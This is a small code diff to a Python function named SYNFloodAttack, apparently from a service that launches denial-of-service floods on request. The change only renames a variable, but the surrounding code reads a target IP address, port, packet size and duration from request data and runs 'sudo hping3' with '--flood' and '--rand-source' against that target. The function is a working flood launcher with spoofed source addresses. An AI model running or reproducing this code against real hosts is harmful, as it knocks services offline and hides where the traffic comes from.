@@ -11,10 +11,10 @@ def SYNFloodAttack():
     ipAddress = data["ipAddress"]
     portNumber = data["portNumber"]
     packetSize = data["packetSize"]
-    type = data["type"]
+    attackType = data["attackType"]
     duration = int(data["duration"])
 
-    dosCommand = subprocess.Popen(['sudo', 'hping3', type, '-d', packetSize, '--flood', '--rand-source', '-p', portNumber, ipAddress])
+    dosCommand = subprocess.Popen(['sudo', 'hping3', attackType, '-d', packetSize, '--flood', '--rand-source', '-p', portNumber, ipAddress])
     time.sleep(duration) # carry out attack for specified duration
 
     try:
